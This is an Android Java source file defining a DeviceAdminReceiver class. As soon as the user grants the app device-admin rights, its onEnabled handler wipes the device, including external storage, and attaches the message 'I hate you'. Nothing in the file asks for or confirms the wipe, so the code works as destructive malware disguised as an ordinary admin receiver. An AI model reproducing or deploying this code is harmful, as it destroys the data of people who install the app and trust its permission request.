package com.candroid.lofl.receivers;

import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.UserHandle;

public class AdminReceiver extends DeviceAdminReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        super.onReceive(context, intent);
    }

    @Override
    public void onEnabled(Context context, Intent intent) {
        super.onEnabled(context, intent);
        try{
            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                devicePolicyManager.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE, "I hate you");
            }else{
                devicePolicyManager.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE);
            }
        }catch (SecurityException e){
            e.printStackTrace();
        }
    }



    @Override
    public void onDisabled(Context context, Intent intent) {
        super.onDisabled(context, intent);
    }


    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        return super.onDisableRequested(context, intent);
    }

    @Override
    public void onPasswordChanged(Context context, Intent intent, UserHandle user) {
        super.onPasswordChanged(context, intent, user);
    }
}
